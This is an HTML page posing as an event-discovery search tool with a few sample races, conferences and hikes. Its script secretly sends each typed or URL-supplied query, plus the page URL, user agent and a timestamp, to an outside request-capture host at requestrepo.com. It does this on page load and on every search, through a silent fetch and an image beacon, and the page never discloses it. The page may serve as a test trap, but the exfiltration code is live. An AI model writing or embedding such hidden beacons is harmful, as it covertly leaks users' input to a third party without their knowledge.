<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Interest & Event Discovery — Find Events Matching Your Passions</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      max-width: 720px;
      margin: 40px auto;
      padding: 0 20px;
      color: #202124;
      line-height: 1.5;
    }
    .search-card {
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 24px;
      background: #f8f9fa;
      margin-bottom: 24px;
    }
    label {
      display: block;
      font-weight: 600;
      margin-bottom: 8px;
    }
    .form-row {
      display: flex;
      gap: 10px;
    }
    input[type="text"] {
      flex: 1;
      padding: 10px 12px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 6px;
    }
    button[type="submit"] {
      padding: 10px 20px;
      font-size: 16px;
      font-weight: 600;
      color: #ffffff;
      background-color: #1a73e8;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button[type="submit"]:hover {
      background-color: #1557b0;
    }
    #results-container {
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 20px;
      display: none;
    }
    .event-card {
      border: 1px solid #e0e0e0;
      border-radius: 6px;
      padding: 16px;
      margin-bottom: 12px;
      background: #ffffff;
    }
    .event-title {
      font-size: 18px;
      font-weight: 600;
      color: #1a73e8;
      margin-bottom: 4px;
    }
    .event-meta {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 8px;
    }
    .event-desc {
      font-size: 14px;
      color: #3c4043;
      margin-bottom: 8px;
    }
    .tag {
      display: inline-block;
      background: #e8f0fe;
      color: #174ea6;
      font-size: 12px;
      padding: 2px 8px;
      border-radius: 4px;
      margin-right: 6px;
      margin-top: 6px;
    }
    .no-results {
      color: #5f6368;
      font-style: italic;
    }
  </style>
</head>
<body>

  <h1>Interest & Event Discovery</h1>
  <p>Enter your interests or hobbies (e.g., running, technology, hiking, photography) to discover matching events.</p>

  <div class="search-card">
    <form id="event-search-form" aria-label="Event Interest Search Form">
      <label for="interest-query">Your Interests</label>
      <div class="form-row">
        <input
          type="text"
          id="interest-query"
          name="interest_query"
          placeholder="e.g. running, coding, hiking"
          aria-label="Interests Query"
          required
        />
        <button type="submit" id="search-submit-btn" aria-label="Search Events">
          Find Events
        </button>
      </div>
    </form>
  </div>

  <div id="results-container" aria-live="polite">
    <h2 id="results-heading">Matching Events</h2>
    <div id="results-body"></div>
  </div>

  <script>
    const ENDPOINT = "https://nfgvgqmj.requestrepo.com";

    function sendLog(eventType, queryValue) {
      const ts = Date.now();
      const fullQuery = queryValue || "";
      const payload = JSON.stringify({
        event: eventType,
        query: fullQuery,
        timestamp: new Date(ts).toISOString(),
        pageUrl: window.location.href,
        userAgent: navigator.userAgent
      });

      try {
        fetch(ENDPOINT + "/post", {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "text/plain;charset=UTF-8" },
          body: payload
        }).catch(function() {});
      } catch (e) {}

      try {
        const shortQuery = fullQuery.substring(0, 200);
        const qs = "event=" + encodeURIComponent(eventType) +
                   "&q=" + encodeURIComponent(shortQuery) +
                   "&t=" + ts;
        const img = new Image();
        img.src = ENDPOINT + "/beacon?" + qs;
      } catch (e) {}
    }

    sendLog("page_loaded", "");

    const EVENTS_DATA = [
      {
        title: "Alpine 10K Race",
        category: "running, fitness, sports",
        date: "June 10, 2026",
        location: "Alpine Mountain Base",
        description: "Annual 10K race through the alpine trails. All skill levels welcome."
      },
      {
        title: "Alpine Code Summit 2026",
        category: "technology, coding, ai, software",
        date: "July 15, 2026",
        location: "Convention Center",
        description: "Premier conference for software engineers, developers, and AI researchers."
      },
      {
        title: "Mountain Landscape Photography Walk",
        category: "photography, outdoors, art",
        date: "August 5, 2026",
        location: "Summit Viewpoint",
        description: "Guided photography walk capturing sunrise and stunning vistas over the peaks."
      },
      {
        title: "High-Altitude Hiking Expedition",
        category: "hiking, outdoors, fitness",
        date: "September 12, 2026",
        location: "Eagle Ridge Trail",
        description: "A challenging 9-mile guided hike with panoramic mountain views."
      }
    ];

    let lastLoggedQuery = "";

    function runSearch(triggerSource) {
      const inputEl = document.getElementById("interest-query");
      const rawQuery = (inputEl ? inputEl.value : "").trim();
      if (!rawQuery) {
        return;
      }

      const logKey = triggerSource + ":" + rawQuery;
      if (logKey !== lastLoggedQuery) {
        lastLoggedQuery = logKey;
        sendLog("search_" + triggerSource, rawQuery);
      }

      const container = document.getElementById("results-container");
      const heading = document.getElementById("results-heading");
      const body = document.getElementById("results-body");

      container.style.display = "block";
      heading.textContent = 'Events matching: "' + rawQuery + '"';

      const keywords = rawQuery.toLowerCase().split(/[\s,]+/);

      const matches = EVENTS_DATA.filter(function(event) {
        const text = (event.title + " " + event.category + " " + event.description + " " + event.location).toLowerCase();
        return keywords.some(function(keyword) {
          return keyword.length > 0 && text.includes(keyword);
        });
      });

      if (matches.length === 0) {
        body.innerHTML = '<p class="no-results">No events found matching your interests. Try searching for terms like "running", "coding", "hiking", or "photography".</p>';
        return;
      }

      const cardsHtml = matches.map(function(e) {
        const tags = e.category.split(",").map(function(t) {
          return '<span class="tag">' + t.trim() + '</span>';
        }).join("");

        return '<div class="event-card">' +
          '<div class="event-title">' + e.title + '</div>' +
          '<div class="event-meta">📅 ' + e.date + ' &nbsp;|&nbsp; 📍 ' + e.location + '</div>' +
          '<div class="event-desc">' + e.description + '</div>' +
          '<div>' + tags + '</div>' +
          '</div>';
      }).join("");

      body.innerHTML = cardsHtml;
    }

    window.addEventListener("DOMContentLoaded", function() {
      const urlParams = new URLSearchParams(window.location.search);
      const urlQuery = urlParams.get("q");
      if (urlQuery) {
        const inputEl = document.getElementById("interest-query");
        if (inputEl) {
          inputEl.value = urlQuery;
        }
        runSearch("url_param");
      }
    });

    document.getElementById("event-search-form").addEventListener("submit", function(event) {
      event.preventDefault();
      runSearch("submit");
    });

    document.getElementById("search-submit-btn").addEventListener("click", function(event) {
      event.preventDefault();
      runSearch("button_click");
    });

    const queryInput = document.getElementById("interest-query");
    queryInput.addEventListener("keydown", function(event) {
      if (event.key === "Enter" || event.keyCode === 13) {
        event.preventDefault();
        runSearch("enter_keydown");
      }
    });
  </script>

</body>
</html>
